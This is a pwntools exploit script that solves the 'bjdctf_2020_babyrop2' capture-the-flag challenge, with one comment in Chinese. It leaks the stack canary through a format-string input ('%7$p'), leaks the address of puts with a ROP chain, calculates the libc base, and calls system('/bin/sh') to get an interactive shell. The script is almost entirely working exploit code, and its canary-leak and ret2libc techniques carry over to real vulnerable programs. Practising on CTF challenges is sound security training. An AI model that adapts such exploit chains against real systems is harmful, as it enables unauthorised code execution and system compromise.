from pwn import * 
context.log_level = 'debug'
io = process('./bjdctf_2020_babyrop2')
#io = gdb.debug('./bjdctf_2020_babyrop2','break vuln')
elf = ELF('./bjdctf_2020_babyrop2')
Lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io.sendlineafter(b"I'll give u some gift to help u!\n",b'%7$p')
io.recvuntil(b'0x')
canary = int(io.recvline(16),16)    #recv(),15或者16都可以,后续函数会自动去除的

print('canary->',hex(canary))
padding = b'A'*0x18+p64(canary)+b'A'*8
payload = padding + p64(0x0000000000400993) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['vuln'])
io.sendlineafter(b'Pull up your sword and tell me u story!',payload)
io.recvuntil(b'\n')
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print('puts_addr->',hex(puts_addr))
Liboffset = puts_addr - Lib.sym['puts']
sys_addr = Liboffset + Lib.sym['system']
bin_sh_addr = Liboffset + next(Lib.search(b'/bin/sh'))
payload = padding+p64(0x0000000000400993)+p64(bin_sh_addr)+p64(0x00000000004005f9)+p64(sys_addr)
io.sendlineafter(b"Pull up your sword and tell me u story!",payload)
io.interactive()

